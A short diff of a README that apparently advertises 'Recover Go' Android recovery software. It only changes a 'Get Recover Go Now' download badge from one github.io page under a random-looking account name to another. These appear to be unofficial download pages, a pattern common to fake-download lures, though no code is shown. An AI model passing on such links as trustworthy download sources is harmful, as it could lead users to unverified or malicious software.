@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://images.g2crowd.com/uploads/product/image/social_landscape/social_landscape_d010c41a7d16f2e096c2ffb808836d78/itoolab-recovergo-android.png)
 
-[![Get Recover Go Now](https://img.shields.io/badge/Get_Recover_Go-Now-0a5d8d?style=for-the-badge&logo=github)](https://darwingordontkrd.github.io/.github/recover-go)
+[![Get Recover Go Now](https://img.shields.io/badge/Get_Recover_Go-Now-0a5d8d?style=for-the-badge&logo=github)](https://ruthhillz610.github.io/.github/recover-go)
 
 ---
 
